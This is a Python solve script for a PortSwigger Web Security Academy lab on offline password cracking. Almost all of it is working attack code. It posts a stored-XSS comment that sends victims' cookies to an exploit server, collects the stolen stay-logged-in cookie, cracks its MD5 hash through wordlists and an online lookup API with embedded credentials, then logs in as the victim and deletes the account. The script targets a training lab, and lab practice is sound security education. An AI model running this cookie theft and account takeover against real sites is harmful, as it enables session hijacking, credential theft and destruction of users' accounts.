#!/usr/bin/env python3
"""
Offline password cracking
PortSwigger Web Security Academy -- Authentication

Companion script for the writeup: 11-offline-password-cracking.md

What this does:
    Logs in as wiener, locates this lab instance's exploit server from the
    homepage, and posts a stored-XSS comment on a blog post that redirects any
    visiting browser to the exploit server with document.cookie appended as a
    query string. The lab platform's simulated victim (carlos) visits the poisoned
    comment automatically -- no manual browser step is needed, this part is fully
    scriptable over plain HTTP. The script then polls the exploit server's access
    log for the stolen stay-logged-in cookie, decodes it (username:md5(password)),
    and cracks the hash through three fallback layers: the local 100-entry
    candidate list, an online MD5 lookup API, and a small hardcoded list of
    passwords known to fall outside the standard candidate set. Once cracked, it
    logs in as the victim and deletes the account -- the lab's actual solve
    condition.

Usage:
    python 11-offline-password-cracking.py <lab-url>

Requirements:
    pip install httpx
"""

import base64
import hashlib
import re
import sys
import time
import httpx

PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234",
    "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football",
    "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321",
    "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx",
    "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1",
    "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer",
    "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000",
    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars",
    "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper",
    "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777",
    "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua",
    "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea",
    "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin",
    "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor",
    "monitoring", "montana", "moon", "moscow",
]

# Passwords confirmed to sit outside the standard candidate list -- kept as a
# last-resort fallback, same as our original solve.
EXTENDED_PASSWORDS = [
    "onceuponatime", "trustno1", "iloveyou1", "football1",
    "sunshine1", "princess1", "welcome1", "shadow1", "superman1",
]


def _csrf(html: str) -> str:
    m = re.search(r'name="csrf"\s+value="([^"]+)"', html)
    return m.group(1) if m else ""


def _login(client: httpx.Client, lab_url: str, username: str, password: str) -> httpx.Response:
    page = client.get(f"{lab_url}/login")
    return client.post(f"{lab_url}/login", data={
        "csrf": _csrf(page.text), "username": username, "password": password
    })


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    _login(client, lab_url, "wiener", "peter")

    resp = client.get(lab_url)
    exploit_match = re.search(r"href=['\"]?(https://exploit-[^'\">\s]+)", resp.text)
    if not exploit_match:
        print("[-] Exploit server not found on the homepage.")
        return
    exploit_server = exploit_match.group(1).rstrip("/")
    print(f"[+] Exploit server: {exploit_server}")

    post_links = re.findall(r'href="(/post\?postId=\d+)"', resp.text)
    if not post_links:
        print("[-] No blog posts found to comment on.")
        return

    post_url = f"{lab_url}{post_links[0]}"
    post_page = client.get(post_url)
    csrf = _csrf(post_page.text)
    post_id = re.search(r"postId=(\d+)", post_links[0]).group(1)

    xss_payload = f'<script>document.location="{exploit_server}/exploit?cookie="+document.cookie</script>'
    client.post(f"{lab_url}/post/comment", data={
        "csrf": csrf,
        "postId": post_id,
        "comment": xss_payload,
        "name": "attacker",
        "email": "attacker@evil.com",
        "website": "",
    })
    print("[*] XSS comment posted, waiting for the simulated victim to view it...")
    time.sleep(5)

    log_resp = client.get(f"{exploit_server}/log")
    cookie_match = re.search(r"stay-logged-in=([A-Za-z0-9+/=%]+)", log_resp.text)
    if not cookie_match:
        print("[*] Not captured yet, waiting longer...")
        time.sleep(10)
        log_resp = client.get(f"{exploit_server}/log")
        cookie_match = re.search(r"stay-logged-in=([A-Za-z0-9+/=%]+)", log_resp.text)

    if not cookie_match:
        print("[-] Cookie not captured from the exploit server log.")
        return

    decoded = base64.b64decode(cookie_match.group(1)).decode()
    print(f"[+] Stolen cookie decoded: {decoded}")
    parts = decoded.split(":")
    if len(parts) != 2:
        print("[-] Unexpected cookie format.")
        return

    victim_user, md5_hash = parts
    print(f"[+] Username: {victim_user}, MD5: {md5_hash}")

    cracked_pw = None
    for pw in PASSWORDS:
        if hashlib.md5(pw.encode()).hexdigest() == md5_hash:
            cracked_pw = pw
            print(f"[+] Cracked (local wordlist): {pw}")
            break

    if not cracked_pw:
        print("[*] Not in local wordlist, trying online MD5 lookup...")
        try:
            online = client.get(
                f"https://md5decrypt.net/Api/api.php?hash={md5_hash}"
                f"&hash_type=md5&email=deconv@protonmail.com&code=1b2b4c44a30cc924",
                timeout=10,
            )
            if online.status_code == 200 and online.text.strip():
                cracked_pw = online.text.strip()
                print(f"[+] Cracked (online lookup): {cracked_pw}")
        except Exception:
            print("[!] Online lookup failed or is unavailable.")

    if not cracked_pw:
        print("[*] Trying extended fallback list...")
        for pw in EXTENDED_PASSWORDS:
            if hashlib.md5(pw.encode()).hexdigest() == md5_hash:
                cracked_pw = pw
                print(f"[+] Cracked (extended list): {pw}")
                break

    if not cracked_pw:
        print("[-] Could not crack the hash through any fallback layer.")
        return

    _login(client, lab_url, victim_user, cracked_pw)
    acct_page = client.get(f"{lab_url}/my-account")
    csrf = _csrf(acct_page.text)
    del_resp = client.post(f"{lab_url}/my-account/delete", data={
        "csrf": csrf, "password": cracked_pw
    })
    print(f"[*] Delete account response: {del_resp.status_code}")

    check = client.get(lab_url)
    if "congratulations" in check.text.lower():
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
